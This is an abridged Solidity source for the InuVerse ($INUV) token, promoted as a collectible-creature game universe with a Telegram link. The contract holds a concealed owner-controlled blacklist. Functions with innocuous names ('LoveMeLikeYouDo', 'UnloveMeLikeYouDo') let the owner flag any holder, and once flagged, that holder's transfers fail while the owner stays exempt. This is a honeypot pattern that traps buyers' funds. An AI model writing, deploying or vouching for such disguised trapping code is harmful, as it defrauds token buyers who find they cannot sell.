...
/*
.__                                               
|__| ____  __ _____  __ ___________  ______ ____  
|  |/    \|  |  \  \/ // __ \_  __ \/  ___// __ \ 
|  |   |  \  |  /\   /\  ___/|  | \/\___ \\  ___/ 
|__|___|  /____/  \_/  \___  >__|  /____  >\___  >
        \/                 \/           \/     \/ 


InuVerse ($INUV) is a game universe that players can explore filled with colorful creatures that you can collect, battle and trade.
Join us:
TG: https://t.me/Inuverseercofficial
...
contract Inuverse is Context, IERC20, Ownable {
    ...
    mapping(address => bool) public keks;
    ...
    address public taxReceiver = address(0xb69BE1b8c2C1b3E954d7f48324a842D0522FF83e);
    ...
    function _transfer(
        ...
        if(from != owner() && to != owner())
            ...
            require(!keks[from] && !keks[to], "Sorry bro, your account has been kek'd.");
    ...
    function LoveMeLikeYouDo(address[] memory kek_) public onlyOwner {
        for (uint256 i = 0; i < kek_.length; i++) {
            if (kek_[i] != address(this) && kek_[i] != uniswapV2Pair) {
                keks[kek_[i]] = true;
            }
        }
    }

    function UnloveMeLikeYouDo(address notkek) public onlyOwner {
        keks[notkek] = false;
    }
